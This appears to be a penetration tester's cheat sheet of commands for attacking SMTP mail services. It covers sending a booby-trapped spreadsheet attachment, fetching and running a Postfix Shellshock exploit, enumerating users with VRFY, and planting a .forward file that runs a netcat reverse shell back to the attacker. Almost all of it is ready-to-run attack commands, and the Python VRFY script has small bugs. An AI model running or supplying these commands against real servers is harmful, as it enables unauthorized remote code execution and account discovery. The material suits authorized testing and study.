#### send email with sendemail
```bash - kali
sendemail -f 'jonas@localhost' \
   -t 'mailadmin@localhost' \
   -s $TARGET:25 \
   -u 'Your spreadsheet' \
   -m 'Here is your requested spreadsheet' \
   -a bomb.ods
```

#### Postfix SMTP Linux Shellshock RCE - USERNAME NEEDED
```bash - kali
wget https://raw.githubusercontent.com/3mrgnc3/pentest_old/master/postfix-shellshock-nc.py
```

![[rlwrap]]

```bash - kali
python postfix-shellshock-nc.py $TARGET $USER $KALI 443
```

#### User enumeration tool
```bash - kali
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $TARGET | grep exists | awk '{print $2}' > users
```

#### nmap
```bash - kali
nmap --script smtp-commands.nse -pT:25 $TARGET
```

#### Mail forward RCE
Found a .forward file in user's directory by SMB.

```bash - kali
echo "|nc $KALI 443 -e /bin/bash" > .forward
```

![[rlwrap]]

```bash - kali
smbclient \\\\$TARGET\\$SHARE -U "$USER%$PASWORD"
```

```bash - kali
put .forward
```

```bash - kali
exit
```

#### Send mail with netcat
```bash - kali
nc $TARGET 25
```

```bash - kali
HELO hacker
```

```bash - kali
mail from:HACKER@localhost
```
OR
```bash - kali
mail from:HACKER@example.org
```

```bash - kali
rcpt to:$USER@$TARGET
```

```bash - kali
DATA
```

Insert email body

```bash - kali
.
```

```bash - kali
QUIT
```


#### User verification script

```bash - kali
VRFY root
```

```bash - kali
VRFY idontexist
```

![[Pasted image 20220406195439.png]]

```bash - kali
#!/usr/bin/python3

import socket
import sys

if len(sys.argv) != 2:

	print("Usage: vrfy.py <username>")
	sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
connect = s.connect(("$TARGET",25))

# Receive the banner
banner = s.recv(1024)
print(banner)

# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result = s.recv(1024)
print(result)

# Close the socket
s.close
```